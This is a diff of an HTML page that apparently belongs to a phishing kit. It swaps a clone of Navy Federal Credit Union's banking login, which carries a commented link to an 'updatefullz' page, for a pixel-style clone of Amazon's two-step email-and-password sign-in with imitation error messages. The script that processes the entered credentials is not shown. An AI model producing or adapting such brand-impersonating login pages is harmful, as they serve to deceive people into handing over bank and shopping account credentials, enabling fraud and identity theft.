@@ -1,189 +1,136 @@
- <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
-    <title>Navy Federal Credit Union - Our Members are the Mission &reg;</title>
-    <link rel="shortcut icon" href="./images/fv-img.ico" type="image/x-icon">
+    <link rel="shortcut icon" href="./images/amz-fvc-img.png" type="image/x-icon">
+    <title>Amazon Sign-In</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.1/css/all.min.css"
         integrity="sha512-5Hs3dF2AEPkpNAR7UiOHba+lRSJNeM2ECkwxUIxC1Q/FLycGTbNapWXB4tP889k5T5Ju8fs4b1P5z/iB4nMfSQ=="
-        crossorigin="anonymous" referrerpolicy="no-referrer"/>
-        <link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
+        crossorigin="anonymous" referrerpolicy="no-referrer" />
     <link rel="stylesheet" href="./style/all.min.css">
     <link rel="stylesheet" href="./style/style.css">
     <script defer src="./script/script.js"></script>
 </head>
+
 <body>
     <main>
-        <div class="headerBackground"> 
-            <div class="headerlogo__small-mobile">
-                <div class="img__1">
-                    <img src="./images/nfc-menu.png" class="imageMenu" alt="">
-                </div>
-                <div class="img__2">
-                    <img src="./images/ncf-logo-img.png" class="imageLogo" alt="">
-                </div>
-                <div class="img__3">
-                    <img src="./images/img-3.jpeg" class="image-Logo" alt="">
-                </div>
-            </div>
-                <div class="headerContainer">
-                    <img src="./images/img-4.png" alt="" class="headerImage">
-                     <img src="./images/img-line.png" alt="" class="backgoundImage">    
-                    <ul class="headerNav">
-                        <li class="rNum">
-                            <p >Routing Number: <span> 256074974</span></p>
-                            <a href="" class="location">
-                                <img src="./images/img-loca.png" alt="" class="location__img">
-                                Location
-                            </a>
-                            <a href=""class="contact">
-                                <img src="./images/img-cal.png" alt="" class="contact__img">
-                                Contact Us
-                            </a>
-                        </li>
-                    </ul>
-                </div>
-        </div>
-        <div class="loginBackground">
-             <div class="loginpanel__container">
-                <h3 class="welcome__heading">Welcome to Digital Banking</h3>
-                <div class="error__container">
-                    <div class="error__wrap">
-                        <img src="./images/error_img.png" alt="" class="warning-icon">
-                        <p>The username or password you entered was incorrect. Please try again.</p>
-                    </div>
-                    <img src="./images/cancel_img.png" alt="" class="xmark">
-                </div>
-                <div class="loginpanel">
-                    <div class="login__padlock">
-                        <i class="fa-solid fa-lock lock-img"></i>
-                        <h3 class="login__heading">Sign In</h3>
-                    </div>
-                    <form action="#" method="" class="login__wrapper">
-                        <div class="username__panel">
-                                <label for="username" class="username__label">
-                                    Username
-                                    <img src="./images/fcu-q-img.png" alt="" class="username__ques-img">
-                                </label>
-                            <input type="text" name="" id="username" class="username__input" autofocus>
-                        </div>
-                        <div class="password__panel">
-                            <label for="password" class="password__label">
-                                Password
-                            </label>
-                            <input type="password" name="" id="password" class="password__input" maxlength="32">
-                            <img src="./images/img-eye-open.png" alt="" class="eye-img">
-                        </div>
-                        <!-- <a href="./updatefullz_1.html" class="sign__btn">Sign In</a> -->
-                            <button type="submit" class="sign__btn" disabled>Sign In</button>
-                    </form>
-                    <a href="#" class="sign__help">Sign In Help</a>
+        <nav>
+            <img src="./images/amz-logo.png" alt="" class="nav__logo">
+        </nav>
 
+        <div class="container">
+            <form action="#" class="amz__form">
+                <div class="firstlogin__login active__page">
+                    <div class="error__container">
+                        <div class="error__message-container">
+                            <h3>There was a problem</h3>
+                            <p>Enter your email or mobile phone number</p>
+                        </div>
+                    </div>
+                    <div class="email__numbererror-container">
+                        <div class="email__message-container">
+                            <h3>No account found with email address or phone number</h3>
+                            <p>Please enter a valid email address or click Create Account if you are new to Amazon.</p>
+                        </div>
+                    </div>
+                    <div class="amz__input-container">
+                        <h1 class="amz__heading">Welcome</h1>
+                        <div class="amz__input-wrapper">
+                            <div class="amz__acct">
+                                <div class="amz__create create-acct">
+                                    <img src="./images/amz-round-img.png" alt="" class="grey__border">
+                                    <p>Create account <span>New to Amazon?</span></p>
+                                </div>
+                                <div class="amz__create sign-acct">
+                                    <img src="./images/amz-round-img-am.png" alt="" class="sky__border">
+                                    <p>Sign in Already a customer?</p>
+                                </div>
+                            </div>
+                            <div class="amz__input">
+                                <label for="email">Email or phone number</label>
+                                <input type="text" class="emailinput" id="email">
+                                <button type="button" class="next-btn">countinue</button>
+                            </div>
+                            <div class="amz__links">
+                                <p class="amz__policy">By continuing, you agree to Amazon's <a href="#">condition of
+                                        use</a> and <a href="#">Privacy Notice.</a></p>
+                                <div class="amz__icon-link">
+                                    <i class="fa-sharp fa-solid fa-angle-down"></i>
+                                    <a href="#">Need help?</a>
+                                </div>
+                            </div>
+                            <div class="amz__work-shop">
+                                <p>Buying for work?</p>
+                                <a href="#">Shop on Amazon Business</a>
+                            </div>
+                        </div>
+                    </div>
                 </div>
-             </div>
-        </div>
-        <div class="customer__section">
-            <div class="member__left-side">
-                <h3 class="member__heading">Not a Navy Federal Member?</h3>
-                <p>Join now and enjoy the support and great service of a credit union that puts your needs first.</p>
-                <div class="buttons">
-                    <a href="#" class="member__btn">Become a Member</a>
-                    <a href="#" class="learn__btn">Learn More</a>
+
+                <!-- second login page -->
+                <div class="secondform__login">
+                    <div class="second__passworderror-container">
+                        <div class="error-emptypassword">
+                            <h3>There was a problem</h3>
+                            <p>Enter your password</p>
+                        </div>
+                    </div>
+                    <div class="incorrectpassword__error-container">
+                        <div class="error-incorrectpassword">
+                            <h3>There was a problem</h3>
+                            <p>Your password is incorrect</p>
+                        </div>
+                    </div>
+                    <h1 class="secondform__heading">
+                        Sign in
+                    </h1>
+                    <div class="amz__userdetail">
+                        <p class="amz__usermail"></p>
+                        <button type="button" class="changepage__btn">Change</button>
+                    </div>
+                    <div class="amz__input-password">
+                        <label for="pass">Amazon password</label>
+                        <input type="password" class="inputpassword" name="" id="pass">
+                    </div>
+                    <div class="amz__show-forgot-password">
+                        <div class="amz__showpass">
+                            <input type="checkbox" class="amz__show" id="show">
+                            <label for="show">Show password</label>
+                        </div>
+                        <a href="#">Forgot password?</a>
+                    </div>
+                    <button type="submit" class="login__btn">Sign in</button>
                 </div>
-            </div>
-            <div class="image__right-side">
-                <img src="./images/img-official.jpeg" alt="" class="customer__img">
-            </div>
-        </div>
-        <div class="enquiries__section">
-            <div class="enquiry__container">
-                <div class="enquiry__box1">
-                    <div class="img__circle">
-                        <img src="./images/fuc-note.jpeg" alt="" class="img__access">
-                    </div>
-                   <div class="enquiry__box1-text">
-                    <p>Don't have online access?</p>
-                    <div class="img__next-container">
-                        <a href="#">Enroll in digital banking</a>
-                        <img src="./images/arrow-next.png" alt="" class="arrow__next">
-                    </div>
-                   </div>
-                </div>
-                <div class="enquiry__box1">
-                    <div class="img__circle">
-                        <img src="./images/fuc-lock.png" alt="" class="img__secure">
-                    </div>
-                   <div class="enquiry__box1-text">
-                    <p>Find out more about secure digital banking</p>
-                    <div class="img__next-container">
-                        <a href="#">Learn More </a>
-                        <img src="./images/arrow-next.png" alt="" class="arrow__next">
-                    </div>
-                   </div>
-                </div>
-                <div class="enquiry__box1">
-                    <div class="img__circle">
-                        <img src="./images/fcu-user.png" alt="" class="img__help">
-                    </div>
-                   <div class="enquiry__box1-text">
-                    <p>Enroll in digital banking</p>
-                    <div class="img__next-container">
-                        <a href="#">Need help?</a>
-                        <img src="./images/arrow-next.png" alt="" class="arrow__next">
-                    </div>
-                   </div>
-                </div>
-            </div>
+            </form>
         </div>
         <footer>
-            <div class="footer__container">
-                <div class="footer__left-img-wrap">
-                    <img src="./images/img-1.png" alt="" class="left-img">
-                </div>
-                <div class="footer__details-right">
-                    <div class="footer__member">
-                        <p class="rout__member"><span>24/7 Member Services:</span><strong> 1-888-842-6328</strong> <span class="pipe__line-rut">|</span> Routing Number: <strong>256074974</strong></p>
-                    </div>
-                    <div class="footer__links">
-                        <li><a href="#">About Us</a></li>|
-                        <li><a href="#">Contact Us</a></li>|
-                        <li><a href="#">Privacy</a></li>|
-                        <li><a href="#">Security</a></li>|
-                        <li><a href="#">Accessibility</a></li>|
-                        <li><a href="#">Browser Support</a></li>
-                    </div>
-                    <div class="footer__union">
-                        <p class="navy"> <strong>© 2025 Navy Federal Credit Union.</strong> All rights reserved.</p>
-                        <div class="footer__housing">
-                            <div class="footer__fede">
-                                <img src="./images/img-house.png" alt="" class="fede-img">
-                                <a href="#">Federally Insured by NCUA <span class="pipe__fade" >|</span>
-                                </a>
-                            </div>
-                            <div class="footer__equal">
-                                <img src="./images/ncu-img.png" alt="" class="equal-img">
-                                <a href="#">Equal Housing Lender
-                                </a>
-                            </div>
-                        </div>
-                    </div>
-                    <div class="footer__paragraphs">
-                        <p>APY = Annual Percentage Yield | APR = Annual Percentage Rate</p>
-                        <p>+Rates are based on an evaluation of credit history, so your rate may differ.</p>
-                        <p>++Rates are variable, and based on an evaluation of credit histroy, so your rate may differ.</p>
-                        <p>*Message and data rates may apply. Terms and Conditions are available.</p>
-                        <p>iPhone®, iPad® and iPod touch® are trademarks of Apple Inc. App StoreSM is a service mark of Apple Inc. AndroidTM and Google PlayTM are</p>
-                        <p>trademarks of Google Inc. Image used for representational purposes only; do not imply government endorsement.</p>
-                        <p>Navy Federal uses small text files called cookies to collect anonymous Web site traffic data. This information helps improve our Web services. Our</p>
-                        <p>cookies do not collect or store any personally identifiable information.</p>
-                        <p class="policy">This site is protected by reCAPTCHA and the Google <a href="#"> Privacy Policy </a>and <a href="#">Terms of Service</a> apply.</p>
-                    </div>
-                </div>
+            <div class="language__state">
+                <a href="" class="language">
+                    <img src="./images/amz-global-img.png" alt="" class="icon__global">
+                    <p class="lang__text">English</p>
+                </a>
+                <a href="" class="state">
+                    <img src="./images/amz-u-s-logo.png" alt="" class="icon__us">
+                    <p class="lang__text">United State</p>
+                </a>
             </div>
-        </footer>  
+            <small class="footer__links" >
+                <a href="#">Conditions of Use</a>
+                <a href="#">Privacy Notice</a>
+                <a href="#">Consumer Health Data Privacy Disclosure</a>
+                <div class="footer__side-wrap">
+                    <a href="#"> Your Ads Privacy Choices </a>
+                <img src="./images/amz-check-mark.png" alt="" class="mark-x">
+                </div>
+            </small>
+            <div class="copyright">
+                <small> © 1996- <span class="year">2025</span>, Amazon.com, Inc. or its affiliates</small>
+            </div>
+        </footer>
     </main>
+
 </body>
+
 </html>
